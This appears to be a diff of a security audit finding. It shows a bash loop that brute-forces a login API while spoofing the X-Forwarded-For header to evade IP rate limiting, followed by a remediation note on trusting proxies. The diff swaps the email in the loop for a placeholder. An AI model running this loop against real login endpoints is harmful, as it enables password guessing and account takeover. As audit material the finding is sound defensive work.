@@ -31,7 +31,7 @@ for i in $(seq 1 1000); do
   curl -s -X POST http://target/api/auth/login \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: 10.0.0.$((i % 255))" \
-    -d '{"email":"vluninf0o@gmail.com","password":"attempt'$i'"}'
+    -d '{"email":"admin@example.com","password":"attempt'$i'"}'
 done
 ```
 - **Remediation:** Only trust X-Forwarded-For behind a known reverse proxy. In development/direct access, use socket IP. Add `TRUSTED_PROXY` env var.
